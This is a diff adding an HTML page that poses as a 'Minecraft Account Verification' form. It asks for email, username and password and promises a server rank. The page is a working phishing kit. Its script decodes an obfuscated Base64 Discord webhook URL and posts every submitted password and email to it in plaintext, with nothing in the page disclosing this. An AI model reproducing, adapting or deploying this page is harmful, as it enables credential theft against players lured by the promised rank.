@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Minecraft Verification</title>
+<style>
+  body {
+    font-family: 'Arial', sans-serif;
+    background: #0b2614;
+    color: #a0d8af;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .login-box {
+    background: rgba(27,66,47,0.95);
+    padding: 40px;
+    border-radius: 12px;
+    width: 350px;
+    box-shadow: 0 0 15px #32cd32;
+    text-align: center;
+  }
+  h1 {
+    margin-bottom: 25px;
+    font-family: 'Press Start 2P', cursive;
+    font-size: 18px;
+  }
+  label {
+    display: block;
+    text-align: left;
+    margin: 10px 0 5px;
+    font-weight: bold;
+  }
+  input {
+    width: 100%;
+    padding: 10px;
+    border-radius: 6px;
+    border: 2px solid #4caf50;
+    background: #122e1f;
+    color: #a0d8af;
+    font-size: 14px;
+    box-sizing: border-box;
+  }
+  input:focus {
+    border-color: #32cd32;
+    outline: none;
+  }
+  button {
+    margin-top: 20px;
+    width: 100%;
+    padding: 12px;
+    font-weight: bold;
+    font-size: 14px;
+    background: #32cd32;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    color: #0a1a0d;
+    transition: background 0.3s ease;
+  }
+  button:disabled {
+    background: #555;
+    cursor: not-allowed;
+    color: #888;
+  }
+  #message {
+    margin-top: 15px;
+    min-height: 40px;
+    font-weight: bold;
+  }
+</style>
+</head>
+<body>
+
+<div class="login-box">
+  <h1>Minecraft Account Verification</h1>
+  <form id="loginForm" autocomplete="off">
+    <label for="email">Email (Gmail preferred)</label>
+    <input type="email" id="email" name="email" placeholder="example@gmail.com" required />
+
+    <label for="username">Minecraft Username</label>
+    <input type="text" id="username" name="username" placeholder="Your Minecraft username" required minlength="3" maxlength="16" />
+
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" placeholder="Your password" required minlength="6" />
+
+    <button type="submit" id="submitBtn">Verify</button>
+  </form>
+  <div id="message"></div>
+</div>
+
+<script>
+  // Base64 encoded webhook URL
+  const encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwODU0OTY4OTMzODQ5NDk4Ni93ZmhaUHNPWHdRTjlnMFhWS0w4TFhEN0ZaOU1aRzNkMFBRX0NXek1oUUJiNFVjS09nV3NwcXJDSWNVQ1UtN2pCSHZaTw==";
+
+  // Decode Base64 to get real webhook URL
+  function decodeWebhook(encoded) {
+    return atob(encoded);
+  }
+
+  const webhookURL = decodeWebhook(encodedWebhook);
+  const form = document.getElementById('loginForm');
+  const message = document.getElementById('message');
+  const submitBtn = document.getElementById('submitBtn');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const email = form.email.value.trim();
+    const username = form.username.value.trim();
+    const password = form.password.value;
+
+    // Input validation
+    if (!email || !username || !password) {
+      message.style.color = 'red';
+      message.textContent = '❌ Please fill in all fields';
+      return;
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Sending...';
+    message.textContent = '';
+
+    const payload = {
+      content: `🎮 Minecraft Verification Submission\nEmail: **${email}**\nUsername: **${username}**\nPassword: **${password}**\n⚠️ If info is wrong, you won’t get rank!`
+    };
+
+    try {
+      const res = await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      if (res.ok) {
+        message.style.color = '#32cd32';
+        message.innerHTML = '✅ Submitted!<br>If you enter wrong info, you won’t get rank. 🙂';
+        form.reset();
+        submitBtn.textContent = 'Verify';
+      } else {
+        throw new Error('Failed to send data');
+      }
+    } catch (error) {
+      message.style.color = 'red';
+      message.textContent = '❌ Submission failed. Please try again later.';
+      submitBtn.textContent = 'Verify';
+    } finally {
+      submitBtn.disabled = false;
+    }
+  });
+</script>
+
+</body>
+</html>
